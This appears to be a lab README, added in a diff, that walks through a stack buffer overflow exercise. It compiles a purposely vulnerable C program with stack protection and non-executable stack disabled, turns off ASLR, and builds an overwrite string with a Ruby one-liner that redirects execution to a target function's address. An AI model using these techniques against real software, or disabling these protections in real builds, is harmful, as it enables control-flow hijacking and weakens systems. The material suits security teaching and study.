@@ -1,0 +1,32 @@
+
+Step 1:  
+Compile vuln_program.c and and attack-string.c
+To compile run the make command. make and press enter.
+Command: make
+
+It will execute below mentioned commands
+gcc ./vuln_program.c -fno-stack-protector -z execstack -static -o vuln_program
+gcc attack-string.c -o attack-string
+	
+Step 2:  Disable address space layout randomization (ASLR)
+On Ubuntu : sudo sysctl -w kernel.randomize_va_space=0
+On RedHat-based system : sudo sysctl -w kernel.exec-shield=0
+
+Step 3: Generate the attack string. 
+1)
+To generate string execute below mentioned commands
+(works only for ubuntu-32bit)
+./attack-string 0804830f > ./attack.input		
+[here '0804830f' is the address of target function ]
+
+2)
+To generate string using ruby:
+ruby -e 'print "B"*112 + "\x0f\x83\x04\x08"' > attack.input 
+[Here "\x0f\x83\x04\x08" is the address of target function in little endian format]
+
+Step 4: Crash the program
+To crash the program, type below mentioned commands
+Command: make perform_buffer_overflow
+
+It will execute below mentioned commands
+./vuln_program < ./attack.input
